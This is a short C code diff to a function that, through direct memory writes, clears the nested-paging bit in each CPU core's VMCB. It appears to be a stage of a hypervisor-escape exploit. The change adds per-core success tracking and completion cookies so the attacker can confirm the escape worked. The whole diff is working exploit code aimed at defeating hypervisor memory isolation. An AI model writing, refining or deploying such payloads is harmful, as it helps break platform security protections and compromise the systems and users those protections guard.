@@ -1,4 +1,5 @@
 #include <stdint.h>
+#include "../../../include/hv/defeat/resume_status.h"
 
 #define VMCB_NESTED_CTRL    0x90
 #define VMCB_CLEAN          0xC0
@@ -13,7 +14,9 @@ void vmcb_disable_np(uint64_t *param)
   uint64_t hv_heap_off = param[4];
   uint64_t pcpus       = param[5];
 
-  write64(param[2], 0xcafedead00001337ULL);
+  uint64_t updated_mask = 0;
+  write64(param[2], PL5_COOKIE_HV_ENTERED);
+  write64(param[2] + 0x10, 0);
 
   uint64_t heap = read64(dmap + hv_heap_off);
 
@@ -32,5 +35,15 @@ void vmcb_disable_np(uint64_t *param)
 
     write64(dmap + vpa + VMCB_NESTED_CTRL, old & ~1);               // disable nested paging
     write32(dmap + vpa + VMCB_CLEAN, 0);                            // force reload on next VMRUN
+    if ((read64(dmap + vpa + VMCB_NESTED_CTRL) & 1) == 0)
+      updated_mask |= 1ULL << core;
   }
+
+  /* Publish completion only AFTER the loop, and only when every expected core
+   * was updated. The hook's earlier cookie is not an escape-success signal. */
+  write64(param[2] + 0x10, updated_mask);
+  __asm__ volatile("" ::: "memory");
+  write64(param[2], updated_mask == PL5_EXPECTED_CORE_MASK
+                        ? PL5_COOKIE_HV_COMPLETE
+                        : PL5_COOKIE_HV_INCOMPLETE);
 }
